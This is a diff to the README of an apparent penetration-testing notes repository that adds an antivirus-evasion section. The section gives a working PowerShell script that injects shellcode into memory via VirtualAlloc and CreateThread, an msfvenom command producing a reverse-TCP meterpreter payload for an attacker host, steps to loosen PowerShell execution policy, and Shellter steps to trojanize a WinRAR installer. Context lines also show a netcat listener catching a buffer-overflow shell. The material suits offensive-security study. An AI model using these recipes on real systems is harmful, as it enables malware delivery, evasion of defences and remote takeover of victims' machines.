@@ -116,6 +116,11 @@ EasyG started out as a script that I use to automate some information gathering 
 - [Artificial intelligence vulnerabilities](#artificial-intelligence-vulnerabilities)
   - [Prompt Injection](#prompt-injection)
 - [Buffer Overflow](#buffer-overflow)
+- [Antivirus Evasion](#antivirus-evasion)
+  - [AV Evasion Categories](#av-evasion-categories)
+  - [Practical examples](#practical-examples)
+    - [PowerShell In-Memory Injection](#powershell-in-memory-injection)
+    - [Shellter](#shellter)
 
 ## Resources
 
@@ -2883,3 +2888,90 @@ On Immunity, using mona, type
    ```
 3. Use the command `nc -nvlp 4444`
 4. Run the script, notice the shell in netcat
+
+
+## Antivirus Evasion
+
+How an Antivirus detects malicious code?
+- Signature-based detection
+- Heuristic and behavioral-based detection
+
+### <ins>AV Evasion Categories</ins>
+**On-disk**
+- Packers
+  -  "[Executable compression | Wikipedia](https://en.wikipedia.org/wiki/Executable_compression)"
+  -  [UPX, the Ultimate Packer for eXecutables](https://upx.github.io/)
+- Obfuscators
+  - "[Dead code | Wikipedia](https://en.wikipedia.org/wiki/Dead_code)"
+- Crypters
+- Software Protectors
+  - [The Enigma Protector](https://enigmaprotector.com/)
+
+**In-memory**
+- Remote Process Memory Injection
+- Reflective DLL Injection
+- Process Hollowing
+- Inline hooking
+
+### <ins>Practical examples</ins>
+
+#### PowerShell In-Memory Injection
+
+- In-memory payload injection script for PowerShell
+  ```PowerShell
+  $code = '
+  [DllImport("kernel32.dll")]
+  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+  [DllImport("kernel32.dll")]
+  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+  [DllImport("msvcrt.dll")]
+  public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+  <# Importing Windows APIs in PowerShell #>
+  
+  $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+  [Byte[]];
+  [Byte[]]$sc = <place your shellcode here>;
+  $size = 0x1000;
+  if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+  $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+  for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
+  <# Memory allocation and payload writing using Windows APIs in PowerShell #>
+  
+  $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+  <# Calling the payload using CreateThread #>
+  ```
+- Generation of a PowerShell compatible payload
+  1. ```PowerShell
+     msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.12.0.7 LPORT=4444 -f powershell
+     ```
+  2. Insert the result in `[Byte[]]$sc` in the PowerShell Script
+  3. Change the ExecutionPolicy for current user
+     ```PowerShell
+     PS C:\> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+     PS C:\> Get-ExecutionPolicy -Scope CurrentUser
+     ```
+  4. Set up a handler to interact with the meterpreter shell
+     ```PowerShell
+     msf exploit(multi/handler) > show options   <# Set the correct values #>
+     msf exploit(multi/handler) > exploit
+     ```
+  5. Run the PowerShell script
+  6. Get the meterpreter shell on the attacking machine
+
+
+#### Shellter
+
+Example of usage
+1. Select Auto mode with `A`
+2. Selecting a target PE in shellter and performing a backup, in this case the WinRAR installer: `/home/kali/Desktop/winrar-x32-621.exe`
+3. Enable stealth mode with `Y`
+4. Select a listed payload with `L`
+5. Select `meterpreter_reverse_tcp` with `1`
+6. Set `LHOST` and `LPORT`
+7. Create a listener in Kali with Metasploit
+   ```
+   msf exploit(multi/handler) > show options
+   msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
+   msf exploit(multi/handler) > exploit
+   ```
+8. Get the meterpreter shell on the attacking machine
